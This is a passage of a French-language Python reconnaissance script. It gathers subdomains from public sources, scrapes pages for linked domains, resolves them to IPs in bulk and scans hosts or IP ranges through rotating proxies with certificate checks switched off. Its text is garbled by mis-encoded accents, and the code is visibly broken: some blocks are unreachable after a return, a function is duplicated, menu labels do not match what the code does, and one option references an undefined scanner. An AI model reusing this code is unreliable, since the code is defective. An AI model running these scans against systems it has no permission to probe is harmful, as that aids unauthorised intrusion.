            # En-t√™te
            f.write(f"=== Analyse de {url} ===\n")
            f.write(f"Date: {datetime.now()}\n\n")

            # Section domaines
            if results.get('domains'):
                f.write("=== DOMAINES TROUV√âS ===\n")
                f.write("\n".join(sorted(set(results['domains']))) + "\n\n")

            # Section IPs
            if results.get('ips'):
                f.write("=== ADRESSES IP R√âSOLUES ===\n")
                f.write("\n".join(sorted(set(results['ips']))) + "\n")

            # Section erreurs (si existantes)
            if results.get('errors'):
                f.write("=== ERREURS RENCONTR√âES ===\n")
                f.write("\n".join(results['errors']) + "\n")

        print(Fore.GREEN + f"‚úÖ R√©sultats sauvegard√©s dans {filename}")
        return filename

    except Exception as e:
        print(Fore.RED + f"‚ùå Erreur lors de la sauvegarde : {str(e)}")
        return None

def resolve_domains(domains, max_workers=20):
    """R√©solution DNS avec gestion d'erreurs"""
    ips = set()
    if not domains:
        return ips
        
    print(Fore.CYAN + "\nüåê R√©solution DNS...")
    
    def resolve(domain):
        try:
            socket.setdefaulttimeout(5)
            return socket.gethostbyname(domain)
        except:
            return None

    with ThreadPoolExecutor(max_workers=max_workers) as executor:
        futures = {executor.submit(resolve, domain): domain for domain in domains}
        for future in tqdm(as_completed(futures), total=len(futures)):
            ip = future.result()
            if ip:
                ips.add(ip)
    
    return ips

def get_working_proxies():
    # Retourne une liste de proxies test√©s et valides
    proxies = []
    with open("proxies.txt", "r") as f:
        for line in f:
            line = line.strip()
            if line and not line.startswith("#"):
                proxies.append(line)
    return proxies

def fetch_url_content(url, proxy=None, max_retries=3):
    timeout_config = (10, 30)
    headers = {
        "User-Agent": "Mozilla/5.0",
        "Accept-Language": "fr-FR,fr;q=0.9",
        "Accept": "text/html,application/xhtml+xml"
    }

    proxies = prepare_proxies(proxy)

    for attempt in range(max_retries):
        try:
            response = requests.get(
                url,
                proxies=proxies,
                timeout=timeout_config,
                verify=False,
                headers=headers
            )
            response.raise_for_status()
            return response.text

        except requests.exceptions.SSLError:
            try:
                response = requests.get(
                    url,
                    proxies=proxies,
                    timeout=timeout_config,
                    verify=False,
                    headers=headers
                )
                return response.text
            except Exception as e:
                print(Fore.YELLOW + f"‚ö†Ô∏è Tentative {attempt + 1}/{max_retries} (sans SSL): {str(e)}")
                if attempt == max_retries - 1:
                    raise

        except Exception as e:
            print(Fore.YELLOW + f"‚ö†Ô∏è Tentative {attempt + 1}/{max_retries}: {str(e)}")
            if attempt == max_retries - 1:
                raise
            time.sleep(2 * (attempt + 1))  # Backoff exponentiel

    raise Exception(f"√âchec apr√®s {max_retries} tentatives")

def show_results_preview(results):
    """Affiche un aper√ßu des r√©sultats"""
    if not results.get('domains') and not results.get('ips'):
        print(Fore.YELLOW + "‚ö†Ô∏è Aucun r√©sultat √† afficher")
        return
    
    print(Fore.CYAN + "\nüîç Aper√ßu des r√©sultats:")
    
    if results.get('domains'):
        print(Fore.MAGENTA + "\nDomaines trouv√©s (10 premiers):")
        for domain in results['domains'][:10]:
            print(Fore.WHITE + f"- {domain}")
        if len(results['domains']) > 10:
            print(Fore.CYAN + f"... et {len(results['domains'])-10} autres")
    
    if results.get('ips'):
        print(Fore.MAGENTA + "\nIPs r√©solues (10 premi√®res):")
        for ip in results['ips'][:10]:
            print(Fore.WHITE + f"- {ip}")
        if len(results['ips']) > 10:
            print(Fore.CYAN + f"... et {len(results['ips'])-10} autres")
    
    if results.get('errors'):
        print(Fore.RED + "\nErreurs rencontr√©es:")
        for error in results['errors'][:3]:  # Affiche seulement les 3 premi√®res erreurs
            print(Fore.YELLOW + f"- {error}")

def analyze_external_js(url, proxy=None):
    """Analyse les fichiers JS externes pour trouver des domaines"""
    domains = set()
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        response = requests.get(
            url,
            proxies=proxies,
            timeout=15,
            verify=False
        )
        
        # Trouver tous les scripts externes
        soup = BeautifulSoup(response.text, "html.parser")
        js_links = [
            script['src'] for script in soup.find_all('script', src=True)
            if script['src'].endswith('.js')
        ]
        
        # Analyser chaque script
        for js_link in js_links[:5]:  # Limiter √† 5 scripts pour la performance
            try:
                if not js_link.startswith('http'):
                    js_link = urljoin(url, js_link)
                
                js_response = requests.get(
                    js_link,
                    proxies=proxies,
                    timeout=10,
                    verify=False
                )
                
                # Recherche de domaines dans le JS
                found = re.findall(
                    r'(?:https?://)?([a-zA-Z0-9.-]+\.[a-z]{2,})',
                    js_response.text
                )
                domains.update(d.lower() for d in found if '.' in d)
                
            except Exception as e:
                continue
                
    except Exception as e:
        print(Fore.YELLOW + f"‚ö†Ô∏è Erreur d'analyse JS: {str(e)}")
    
    return domains

def fetch_with_retry(url, proxy=None, max_retries=3):
    """Tente de r√©cup√©rer le contenu avec diff√©rentes strat√©gies"""
    strategies = [
        {'verify': False, 'stream': False},  # Essai 1: standard
        {'verify': False, 'stream': True},   # Essai 2: mode stream
        {'verify': False, 'timeout': 60}     # Essai 3: timeout plus long
    ]
    
    for attempt in range(max_retries):
        strategy = strategies[min(attempt, len(strategies)-1)]
        try:
            response = requests.get(
                url,
                proxies=proxy,
                timeout=strategy.get('timeout', 30),
                verify=strategy['verify'],
                stream=strategy.get('stream', False),
                headers={"User-Agent": "Mozilla/5.0"}
            )
            return response.text
        except Exception as e:
            print(Fore.YELLOW + f"‚ö†Ô∏è Tentative {attempt+1} (strat√©gie {strategy}): {str(e)}")
            if attempt == max_retries - 1:
                raise
            time.sleep(2)

def analyze_http_headers(url, proxy=None):
    """Retourne maintenant une liste au lieu d'un set"""
    try:
        proxies = {"http": proxy, "https": proxy} if proxy else None
        response = requests.head(
            url,
            proxies=proxies,
            timeout=(10, 15),
            allow_redirects=True,
            verify=False
        )
        
        domains = []
        headers_to_check = ['Location', 'Content-Security-Policy', 'X-Frame-Options']
        
        for header in headers_to_check:
            if header in response.headers:
                found = re.findall(r'([a-zA-Z0-9.-]+\.[a-z]{2,})', response.headers[header])
                domains.extend(found)
                
        return list(set(domains))  # Retourne une liste sans doublons
        
    except Exception as e:
        print(Fore.YELLOW + f"‚ö†Ô∏è Erreur d'analyse des en-t√™tes: {str(e)}")
        return []

# Fonction d'extraction des domaines
def extract_domains_from_html(html, base_url=None):
    """Version robuste de l'extraction de domaines"""
    try:
        soup = BeautifulSoup(html, "html.parser")
    except Exception as e:
        print(Fore.YELLOW + f"‚ö†Ô∏è Erreur d'analyse HTML: {str(e)}")
        return []

    domains = set()

    # 1. Extraction standard depuis les balises
    tags_attrs = [
        ('a', 'href'),
        ('link', 'href'),
        ('script', 'src'),
        ('img', 'src'),
        ('iframe', 'src'),
        ('form', 'action'),
        ('meta', 'content'),
        ('object', 'data'),
        ('embed', 'src')
    ]

    for tag, attr in tags_attrs:
        try:
            for element in soup.find_all(tag):
                url = element.get(attr)
                if url:
                    parsed = urlparse(url)
                    if parsed.netloc:
                        domains.add(parsed.netloc.lower())
                    elif base_url:
                        full_url = urljoin(base_url, url)
                        parsed_full = urlparse(full_url)
                        if parsed_full.netloc:
                            domains.add(parsed_full.netloc.lower())
        except Exception as e:
            print(Fore.YELLOW + f"‚ö†Ô∏è Erreur avec balise {tag}: {str(e)}")
            continue

    # 2. Extraction depuis les commentaires (avec v√©rification)
    try:
        comments = soup.find_all(string=lambda text: isinstance(text, Comment))
        for comment in comments:
            found = re.findall(
                r'(https?://[a-zA-Z0-9.-]+\.[a-z]{2,})',
                str(comment),
                re.IGNORECASE
            )
            domains.update(d.lower() for d in found)
    except Exception as e:
        print(Fore.YELLOW + f"‚ö†Ô∏è Erreur d'analyse des commentaires: {str(e)}")

    # 2. Extraction depuis le contenu JavaScript
    for script in soup.find_all("script"):
        if script.string:
            # URLs dans les scripts
            found = re.findall(
                r'(https?://[a-zA-Z0-9.-]+\.[a-z]{2,})',
                script.string,
                re.IGNORECASE
            )
            domains.update(map(str.lower, found))
            
            # Domaines nus dans les scripts
            naked_domains = re.findall(
                r'(?:[a-zA-Z0-9.-]+\.)?[a-zA-Z0-9-]+\.[a-z]{2,}',
                script.string
            )
            domains.update(d.lower() for d in naked_domains if '.' in d)

    # 3. Extraction depuis les commentaires HTML
    for comment in soup.find_all(string=lambda text: isinstance(text, Comment)):
        found = re.findall(
            r'(https?://[a-zA-Z0-9.-]+\.[a-z]{2,})',
            comment,
            re.IGNORECASE
        )
        domains.update(map(str.lower, found))

    # 4. Extraction depuis les donn√©es JSON embarqu√©es
    for element in soup.find_all(string=True):
        try:
            data = json.loads(element.string)
            if isinstance(data, dict):
                for value in data.values():
                    if isinstance(value, str) and '.' in value:
                        parsed = urlparse(value)
                        if parsed.netloc:
                            domains.add(parsed.netloc.lower())
        except:
            pass

    # Filtrage et nettoyage
    filtered = set()
    for domain in domains:
        domain = domain.strip()
        if not domain or domain.startswith(('data:', 'about:', 'javascript:')):
            continue
        
        # Suppression des ports et chemins
        domain = domain.split(':')[0].split('/')[0]
        
        # Validation du domaine
        if re.match(r'^([a-z0-9]+(-[a-z0-9]+)*\.)+[a-z]{2,}$', domain):
            filtered.add(domain)

    return sorted(filtered)

# Fonction principale d'analyse
def analyse_page_web():
    """Analyse compl√®te d'une page web avec d√©tection enrichie de domaines"""
    print(Fore.CYAN + "\n=== ANALYSE DE PAGE WEB ===")
    
    # Saisie et validation de l'URL
    url = input("Entrez l'URL √† analyser : ").strip()
    if not url:
        print(Fore.RED + "‚ùå URL vide")
        return

    if not url.startswith(('http://', 'https://')):
        url = f"http://{url}"

    # Configuration proxy
    proxy = None
    proxy_config = input("Utiliser un proxy? (o/n/auto) : ").lower()
    if proxy_config == 'auto':
        proxy = "auto"
        print(Fore.CYAN + "üîÅ Mode proxy automatique activ√©")
    elif proxy_config == 'o':
        proxy = select_proxy_interactive()

    results = {'domains': [], 'ips': [], 'errors': []}

    try:
        # R√©cup√©ration du contenu
        print(Fore.YELLOW + "\n‚åõ R√©cup√©ration du contenu HTML...")
        html = fetch_url_content(url, proxy)

        # Analyse HTML
        print(Fore.YELLOW + "‚åõ Extraction des domaines HTML...")
        domains_html = extract_domains_from_html(html, url)

        # Analyse JS
        print(Fore.YELLOW + "‚åõ Analyse des scripts JS...")
        domains_js = analyze_external_js(url, proxy)

        # Analyse des en-t√™tes HTTP
        print(Fore.YELLOW + "‚åõ Analyse des en-t√™tes HTTP...")
        domains_headers = analyze_http_headers(url, proxy)

        # Fusionner tous les domaines (uniques)
        all_domains = set(domains_html + list(domains_js) + domains_headers)
        results['domains'] = list(all_domains)

        print(Fore.CYAN + f"\n‚Ä¢ {len(domains_html)} domaines depuis HTML")
        print(Fore.CYAN + f"‚Ä¢ {len(domains_js)} depuis JS")
        print(Fore.CYAN + f"‚Ä¢ {len(domains_headers)} depuis en-t√™tes")
        print(Fore.GREEN + f"‚Üí Total unique : {len(all_domains)} domaines d√©tect√©s")

        # R√©solution DNS
        if all_domains:
            print(Fore.CYAN + f"\nüåê R√©solution DNS pour {len(all_domains)} domaines...")
            with ThreadPoolExecutor(max_workers=50) as executor:
                futures = {executor.submit(socket.gethostbyname, domain): domain for domain in all_domains}
                for future in tqdm(as_completed(futures), total=len(futures)):
                    try:
                        ip = future.result()
                        if ip:
                            results['ips'].append(ip)
                    except:
                        continue

    except Exception as e:
        error_msg = f"Erreur lors de l'analyse : {str(e)}"
        print(Fore.RED + f"‚ùå {error_msg}")
        results['errors'].append(error_msg)
        traceback.print_exc()

    # Sauvegarde et affichage
    saved_file = save_results(url, results)
    if saved_file:
        print(Fore.CYAN + "\n=== R√âCAPITULATIF ===")
        print(Fore.GREEN + f"‚Ä¢ Domaines trouv√©s : {len(results['domains'])}")
        print(Fore.GREEN + f"‚Ä¢ IPs r√©solues : {len(results['ips'])}")
        if results.get('errors'):
            print(Fore.RED + f"‚Ä¢ Erreurs : {len(results['errors'])}")

    return results
            
def extract_domains_from_page(url, domain, output_file):
    use_proxy = input("Utiliser un proxy pour le scan des r√©sultats? (o/n/auto) : ").lower()
    proxy = None
    domains = []

    if use_proxy == "o":
        proxy_choice = input("1. Entrer manuellement\n2. Choisir depuis le fichier\nChoix (1/2) : ").strip()
        if proxy_choice == "1":
            proxy_url = input("URL du proxy (ex: http://123.45.67.89:8080) : ").strip()
            proxy = {"http": proxy_url, "https": proxy_url}
        elif proxy_choice == "2":
            proxy_url = select_proxy_interactive()
            if proxy_url:
                proxy = {"http": proxy_url, "https": proxy_url}

    elif use_proxy == "auto":
        proxy_manager = ProxyManager()
        proxy_manager.load_proxies()
        proxy_list = proxy_manager.get_best_proxies(limit=15)
        if not proxy_list:
            print(Fore.RED + "‚ùå Aucun proxy disponible.")
            return []

        for raw_proxy in proxy_list:
            proxy_url = raw_proxy.split("|")[0].strip()
            proxy = {"http": proxy_url, "https": proxy_url}
            print(Fore.CYAN + f"üîÅ Test avec proxy: {proxy_url}")
            try:
                html = requests.get(url, proxies=proxy, timeout=10, verify=False).text
                domains = extract_domains_from_html(html)
                if domains:
                    break
            except Exception as e:
                print(Fore.YELLOW + f"‚ö†Ô∏è Proxy non fonctionnel: {proxy_url} ‚Äî {e}")
                proxy = None

        if not proxy:
            print(Fore.RED + "‚ùå Aucun proxy n‚Äôa permis d‚Äôacc√©der √† la page.")
            return []

    else:
        try:
            html = requests.get(url, timeout=10, verify=False).text
            domains = extract_domains_from_html(html)
        except Exception as e:
            print(Fore.RED + f"‚ùå Erreur HTTP: {e}")
            return []

    if domains:
        with open(output_file, 'w') as f:
            for d in sorted(domains):
                f.write(d + "\n")
        print(Fore.GREEN + f"‚úì {len(domains)} domaines extraits et sauvegard√©s dans {output_file}")

        show_preview = input("Souhaitez-vous voir un aper√ßu des r√©sultats ? (o/n) : ").strip().lower()
        if show_preview == "o":
            print(Fore.CYAN + "\nüîç Aper√ßu des premiers domaines d√©tect√©s :\n")
            for d in sorted(domains)[:10]:
                print("‚Ä¢", d)
            if len(domains) > 10:
                print(Fore.YELLOW + f"... et {len(domains) - 10} autres enregistr√©s.")
    return domains
    
def combiner_recherches():
    print(Fore.CYAN + "\n‚ö° Combinaison de la recherche passive et de l‚Äôanalyse web")
    domaine = input(Fore.YELLOW + "Entrez le nom de domaine principal (ex : example.com) : ").strip()
    if not domaine:
        print(Fore.RED + "‚ùå Domaine invalide.")
        return

    passive_file = f"{domaine}_domains.txt"
    web_file = f"{domaine}_web.txt"

    domaines = set()

    # Chargement intelligent des fichiers
    if os.path.exists(passive_file):
        reuse = input(f"\nUn fichier {passive_file} existe d√©j√†. Le r√©utiliser ? (o/n) : ").strip().lower()
        if reuse == "o":
            with open(passive_file, 'r') as f:
                domaines.update(line.strip() for line in f if line.strip())
        else:
            domaines.update(find_domains(domaine, auto_continue=True))

    else:
        domaines.update(find_domains(domaine, auto_continue=True))

    if os.path.exists(web_file):
        reuse = input(f"\nUn fichier {web_file} existe d√©j√†. Le r√©utiliser ? (o/n) : ").strip().lower()
        if reuse == "o":
            with open(web_file, 'r') as f:
                domaines.update(line.strip() for line in f if line.strip())
        else:
            domaines.update(extract_domains_from_page(f"http://{domaine}", domaine, web_file))
    else:
        domaines.update(extract_domains_from_page(f"http://{domaine}", domaine, web_file))

    print(Fore.CYAN + f"\n‚úÖ Total combin√© de domaines uniques : {len(domaines)}")

    if not domaines:
        print(Fore.RED + "‚ùå Aucun domaine √† r√©soudre.")
        return

    # R√©solution DNS
    suite = input("Souhaitez-vous r√©soudre ces domaines en IPs maintenant ? (o/n) : ").strip().lower()
    if suite != "o":
        return

    mode = select_resolver_mode()
    resolver_func = get_resolver_function(mode)
    ip_file = f"{domaine}_ips.txt"
    ips = resolve_and_save_ips(domaines, ip_file, resolver_func)

    if ips:
        scan = input("Souhaitez-vous scanner maintenant les IPs r√©solues ? (o/n) : ").lower()
        if scan == 'o':
            scan_resolved_ips(ip_file)

def resolve_ip_hybride(domain):
    """Essaye d'abord la r√©solution locale, puis fallback DNS over HTTPS (Cloudflare)"""
    try:
        return socket.gethostbyname(domain)
    except:
        try:
            url = f"https://cloudflare-dns.com/dns-query?name={domain}&type=A"
            headers = {
                "accept": "application/dns-json",
                "user-agent": "Mozilla/5.0"
            }
            response = requests.get(url, headers=headers, timeout=5)
            data = response.json()
            answers = data.get("Answer", [])
            for ans in answers:
                if ans.get("type") == 1:
                    return ans.get("data")
        except:
            return None

from tqdm import tqdm
from concurrent.futures import ThreadPoolExecutor, as_completed

def resolve_and_save_ips(domains, ip_file=None, resolver_fn=None):
    """R√©solution DNS intensive avec fonction personnalis√©e et sauvegarde horodat√©e"""
    if not domains or not resolver_fn:
        return set()

    print(Fore.CYAN + f"\n‚ö° R√©solution DNS avanc√©e pour {len(domains)} domaines...")
    ips = set()

    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(resolver_fn, domain): domain for domain in domains}

        for future in tqdm(as_completed(futures), total=len(futures), desc="R√©solution DNS"):
            ip = future.result()
            if ip and is_valid_ip(ip):
                ips.add(ip)

    if not ip_file:
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        ip_file = f"resolved_ips_{timestamp}.txt"

    if ips:
        with open(ip_file, 'w') as f:
            f.write("\n".join(sorted(ips, key=lambda x: tuple(map(int, x.split('.'))))))
        print(Fore.GREEN + f"‚úì {len(ips)} IPs valides sauvegard√©es dans {ip_file}")
    else:
        print(Fore.YELLOW + "‚ö†Ô∏è Aucune IP valide r√©solue")

    return ips



    # Traitement parall√®le
    with ThreadPoolExecutor(max_workers=100) as executor:
        futures = {executor.submit(resolver_func, d): d for d in domains}
        for future in tqdm(as_completed(futures), total=len(futures), desc="R√©solution DNS"):
            ip = future.result()
            if ip and is_valid_ip(ip):
                ips.add(ip)

    # Sauvegarde
    if ips:
        with open(ip_file, 'w') as f:
            f.write("\n".join(sorted(ips, key=lambda x: tuple(map(int, x.split('.'))))))
        print(Fore.GREEN + f"\n‚úì {len(ips)} IPs valides sauvegard√©es dans {ip_file}")
    else:
        print(Fore.YELLOW + "\n‚ö†Ô∏è Aucune IP valide n‚Äôa √©t√© r√©solue.")

    return ips

    def resolve_and_save_ips(domains, ip_file=None, resolver_fn=None):
        """R√©solution DNS intensive avec fonction personnalis√©e et sauvegarde horodat√©e"""
        if not domains or not resolver_fn:
            print(Fore.RED + "‚ùå Aucune liste de domaines ou de fonction de r√©solution fournie.")
            return set()
    
        print(Fore.CYAN + f"\n‚ö° R√©solution DNS avanc√©e pour {len(domains)} domaines...")
        ips = set()
    
        with ThreadPoolExecutor(max_workers=100) as executor:
            futures = {executor.submit(resolver_fn, domain): domain for domain in domains}
    
            for future in tqdm(as_completed(futures), total=len(futures), desc="R√©solution DNS"):
                ip = future.result()
                if ip and is_valid_ip(ip):
                    ips.add(ip)
    
        timestamp = datetime.now().strftime("%Y%m%d_%H%M%S")
        ip_file = ip_file or f"resolved_ips_{timestamp}.txt"
    
        if ips:
            with open(ip_file, 'w') as f:
                f.write("\n".join(sorted(ips, key=lambda x: tuple(map(int, x.split('.'))))))
            print(Fore.GREEN + f"\n‚úì {len(ips)} IPs valides sauvegard√©es dans {ip_file}")
        else:
            print(Fore.YELLOW + "\n‚ö†Ô∏è Aucune IP valide n‚Äôa √©t√© r√©solue.")
    
        return ips
    
def manage_domain_scan(domain):
    """Version avec gestion du proxy et mode turbo"""
    domain_file = f"{domain}_domains.txt"
    ip_file = f"{domain}_ips.txt"
    
    # Configuration proxy et turbo
    proxy = None
    turbo = False
    
    while True:
        # Chargement initial des donn√©es existantes
        domains = set()
        ips = set()
        
        if os.path.exists(domain_file):
            with open(domain_file, 'r') as f:
                domains = {line.strip() for line in f if line.strip()}
        
        if os.path.exists(ip_file):
            with open(ip_file, 'r') as f:
                ips = {line.strip() for line in f if line.strip()}

        # Affichage du menu
        print(Fore.CYAN + "\n" + "="*40)
        print(Fore.YELLOW + f"R√©sultats pour {domain}:")
        print(Fore.GREEN + f"- {len(domains)} domaines")
        print(Fore.GREEN + f"- {len(ips)} IPs")
        if proxy:
            print(Fore.MAGENTA + f"- Proxy actif: {proxy}")
        print(Fore.CYAN + "="*40)
        
        print(Fore.MAGENTA + "\nOptions:")
        print(Fore.CYAN + "1. Mettre √† jour la liste des domaines")
        print(Fore.CYAN + "2. R√©soudre les DNS et trouver les IPs")
        print(Fore.CYAN + "3. Configurer le proxy pour le scan")
        print(Fore.CYAN + "4. Scanner les r√©sultats actuels")
        print(Fore.CYAN + "5. Retour au menu principal")
        
        choice = input(Fore.YELLOW + "Votre choix (1-5): ").strip()
        
        if choice == "1":  # Scanner une plage d'IP
            print(Fore.YELLOW + "\nFormat d'exemple : 192.168.0.1-192.168.0.255 ou 10.0.0.0/24")
            ip_range = input("Plage d'IP √† scanner (ou 'retour') : ").strip()
            if ip_range.lower() == "retour":
                continue
        
            threads = input("Nombre de threads (10-500) ou 'retour' : ").strip()
            if threads.lower() == "retour":
                continue
        
            try:
                threads = max(10, min(500, int(threads)))
            except:
                print(Fore.RED + "‚ùå Entr√©e invalide.")
                continue
        
            proxy = get_proxy_config()
            turbo = False
            if proxy == "auto":
                turbo = input("Activer le mode turbo proxy ? (o/n) : ").lower() == 'o'
        
            scanner = HostScanner(
                ip_range=ip_range,
                threads=threads,
                proxy=proxy,
                turbo_mode=turbo
            )
            scanner.run()
        
        elif choice == "2":  # Scanner depuis fichier
            filename = input("Chemin du fichier contenant IPs/domaines (ou 'retour') : ").strip()
            if filename.lower() == "retour":
                continue
        
            if not os.path.exists(filename):
                print(Fore.RED + "‚ùå Fichier introuvable.")
                continue
        
            with open(filename, 'r') as f:
                sample = f.read(1024)
                has_domains = any(c.isalpha() for c in sample)
        
            if has_domains:
                print(Fore.CYAN + "\n‚ö†Ô∏è Ce fichier semble contenir des domaines.")
                print(Fore.YELLOW + "Cette option utilise un scan HTTP pour identifier les domaines actifs.\n")
        
                threads = input("Nombre de workers (10-500) ou 'retour' : ").strip()
                if threads.lower() == "retour":
                    continue
        
                try:
                    workers = max(10, min(500, int(threads)))
                except:
                    print(Fore.RED + "‚ùå Entr√©e invalide.")
                    continue
        
                proxy = get_proxy_config()
                turbo = False
                if proxy == "auto":
                    turbo = input("Mode turbo pour proxy ? (o/n) : ").lower() == 'o'
        
                scanner = HostScanner(
                    filename=filename,
                    threads=workers,
                    proxy=proxy,
                    turbo_mode=turbo
                )
                scanner.run()
            else:
                print(Fore.YELLOW + "\nüìÑ Fichier reconnu comme une liste d'IPs.")
                threads = input("Nombre de threads (10-500) ou 'retour' : ").strip()
                if threads.lower() == "retour":
                    continue
        
                try:
                    threads = max(10, min(500, int(threads)))
                except:
                    print(Fore.RED + "‚ùå Entr√©e invalide.")
                    continue
        
                proxy = get_proxy_config()
                turbo = False
                if proxy == "auto":
                    turbo = input("Mode turbo pour proxy ? (o/n) : ").lower() == 'o'
        
                scanner = HostScanner(
                    filename=filename,
                    threads=threads,
                    proxy=proxy,
                    turbo_mode=turbo
                )
                scanner.run()
            
        elif choice == "3":
            # Option 3 - Configuration du proxy pour le scan
            proxy_choice = input("Utiliser un proxy pour le scan? (o/n/auto) : ").lower()
            if proxy_choice == 'auto':
                proxy = "auto"
                turbo = input(Fore.CYAN + "Activer le mode turbo pour proxy? (o/n) : ").lower() == 'o'
                print(Fore.CYAN + "üîÅ Mode proxy automatique activ√©" + (" avec turbo" if turbo else ""))
            elif proxy_choice == 'o':
                proxy_choice = input("1. Entrer manuellement\n2. Choisir depuis le fichier\nChoix (1/2) : ")
                if proxy_choice == "1":
                    proxy = input("URL du proxy (ex: http://123.45.67.89:8080) : ")
                elif proxy_choice == "2":
                    proxy = select_proxy_interactive()
            else:
                proxy = None
                turbo = False
                print(Fore.CYAN + "Proxy d√©sactiv√© pour le scan")
        
        elif choice == "4":
            # Option 4 - Scanner les r√©sultats avec gestion du proxy et turbo
            targets = []
            if os.path.exists(domain_file):
                with open(domain_file, 'r') as f:
                    targets.extend(line.strip() for line in f if line.strip())
            
            if os.path.exists(ip_file):
                with open(ip_file, 'r') as f:
                    targets.extend(line.strip() for line in f if line.strip())
            
            if not targets:
                print(Fore.RED + "‚ùå Aucune cible √† scanner")
                continue
                
            temp_file = "temp_scan.txt"
            with open(temp_file, 'w') as f:
                f.write("\n".join(targets))
            
            # Configuration du scanner avec le proxy et turbo
            scanner = HostScanner(
                filename=temp_file,
                threads=100 if turbo else 50,  # Plus de threads en mode turbo
                proxy=proxy,
                turbo_mode=turbo
            )
            
            if proxy == "auto":
                mode = "automatique" + (" avec turbo" if turbo else "")
                print(Fore.CYAN + f"\n‚ö° Scan avec rotation {mode}")
                threading.Thread(target=monitor_proxy_usage, args=(scanner,), daemon=True).start()
            elif proxy:
                print(Fore.CYAN + f"\n‚ö° Scan avec proxy fixe: {proxy}" + (" (turbo)" if turbo else ""))
            else:
                print(Fore.CYAN + "\n‚ö° Scan sans proxy")
                
            scanner.run()
            os.remove(temp_file)

        elif choice == "21":
            filename = input("Chemin du fichier (domaines) : ").strip()
            if not os.path.exists(filename):
                print(Fore.RED + "‚ùå Fichier introuvable.")
                return
        
            workers = min(500, int(input("Nombre de workers (10-500) : ").strip() or "100"))
        
            proxy_manager = ProxyManager()
            proxy_manager.load_proxies()
        
            if not proxy_manager.proxies:
                print(Fore.RED + "‚ùå Aucun proxy valide disponible.")
                return
        
            scanner.attach_proxy_manager(proxy_manager, reuse_limit=5)
            scanner.scan_file(filename)
        
            # Export des r√©sultats
            if scanner.results:
                output_file = f"scan_resultats_{datetime.now().strftime('%Y%m%d_%H%M%S')}.txt"
                with open(output_file, 'w', encoding='utf-8') as f:
                    for r in scanner.results:
                        f.write(f"{r['domain']} | Status: {r['status']} | Server: {r['server']}\n")
                print(Fore.GREEN + f"\n‚úÖ R√©sultats sauvegard√©s dans {output_file}")
            else:
                print(Fore.YELLOW + "\nAucun h√¥te actif d√©tect√©.")

        elif choice == "5":
            # Option 5 - Retour
            print(Fore.CYAN + "\nRetour au menu principal...")
            break
            
        else:
            print(Fore.RED + "‚ùå Option invalide. Veuillez r√©essayer.")

def show_scan_menu():
    """Affiche le menu des options de scan"""
    print(Fore.MAGENTA + "\nOptions:")
    print(Fore.CYAN + "1. Mettre √† jour la liste des domaines")
    print(Fore.CYAN + "2. R√©soudre les DNS et trouver les IPs")
    print(Fore.CYAN + "3. Scanner les r√©sultats actuels")
    print(Fore.CYAN + "4. Retour au menu principal")
    return input(Fore.YELLOW + "Votre choix (1-4): ").strip()

def update_domains(domain, domain_file, ip_file):
    """Force la mise √† jour de la liste des domaines"""
    print(Fore.CYAN + "\nüîç Mise √† jour des domaines...")
    try:
        os.remove(domain_file)
        os.remove(ip_file) if os.path.exists(ip_file) else None
    except Exception as e:
        print(Fore.YELLOW + f"‚ö†Ô∏è Erreur lors de la suppression des fichiers: {str(e)}")

def resolve_domain(domain):
    """R√©sout un seul domaine en IP"""
    try:
        socket.setdefaulttimeout(3)
        return socket.gethostbyname(domain)
    except:
        return None

def run_scan(targets):
    """Lance le scan des cibles"""
    temp_file = "temp_scan.txt"
    try:
        with open(temp_file, 'w') as f:
            f.write("\n".join(targets) + "\n")
        
        print(Fore.CYAN + "\n‚ö° Pr√©paration du scan...")
        scanner = HostScanner(filename=temp_file)
        scanner.run()
    finally:
        if os.path.exists(temp_file):
            os.remove(temp_file)

def get_domains_and_ips(domain):
    """R√©cup√®re uniquement les domaines associ√©s"""
    print(Fore.CYAN + f"\nüîç Recherche des domaines pour {domain}...")
    
    # V√©rifier le cache
    cache_file = f"{domain}_domains.txt"
    if os.path.exists(cache_file):
        print(Fore.GREEN + "‚úì Chargement depuis le cache existant...")
        with open(cache_file, 'r') as f:
            domains = {line.strip() for line in f if line.strip()}
        return sorted(domains), []  # Retourne une liste d'IPs vide
    
    domains = set()
    
    # Sources disponibles
    sources = [
        {
            'name': 'Hackertarget',
            'url': f"https://api.hackertarget.com/hostsearch/?q={domain}",
            'handler': lambda r: [line.split(',')[0].lower().strip() 
                               for line in r.text.splitlines() if ',' in line]
        },
        {
            'name': 'crt.sh',
            'url': f"https://crt.sh/?q=%25.{domain}&output=json",
            'handler': lambda r: [name.lower().strip() 
                                for cert in r.json() 
                                for name in cert.get('name_value', '').split('\n')
                                if name and '*' not in name and domain in name]
        }
    ]
    
    for source in sources:
        try:
            print(Fore.CYAN + f"‚ñ™ Interrogation de {source['name']}...")
            response = requests.get(source['url'], timeout=15)
            if response.status_code == 200:
                domains.update(d for d in source['handler'](response) if d)
        except Exception as e:
            print(Fore.YELLOW + f"‚ö†Ô∏è Erreur avec {source['name']}: {str(e)}")
            continue
    
    # Sauvegarde initiale dans le cache
    if domains:
        domains.add(domain)  # Ajout du domaine principal
        with open(cache_file, 'w') as f:
            f.write("\n".join(sorted(domains)))
        print(Fore.GREEN + f"‚úì {len(domains)} domaines sauvegard√©s dans {cache_file}")
    
    return sorted(domains), []  # Retourne une liste d'IPs vide

def resolve_and_scan(domains, proxy=None):
    """R√©solution DNS et scan des r√©sultats"""
    if not domains:
        print(Fore.RED + "‚ùå Aucun domaine √† r√©soudre")
        return []
    
    print(Fore.CYAN + f"\n‚ö° R√©solution DNS de {len(domains)} domaines...")
    ips = set()
    
    def resolve(domain):
        try:
            socket.setdefaulttimeout(3)
            return socket.gethostbyname(domain)
        except:
            return None
    
    with ThreadPoolExecutor(max_workers=50) as executor:
        futures = {executor.submit(resolve, domain): domain for domain in domains}
        for future in tqdm(as_completed(futures), total=len(futures), desc="R√©solution"):
            ip = future.result()
            if ip:
                ips.add(ip)
    
    # Sauvegarde des IPs
    if ips:
        ip_file = f"{domain}_ips.txt"
        with open(ip_file, 'w') as f:
            f.write("\n".join(sorted(ips)))
        print(Fore.GREEN + f"‚úì {len(ips)} IPs sauvegard√©es dans {ip_file}")
    
    return sorted(ips)

def main_scan_flow(domain, proxy=None):
    """Flux principal de scan"""
    # √âtape 1: R√©cup√©ration des domaines
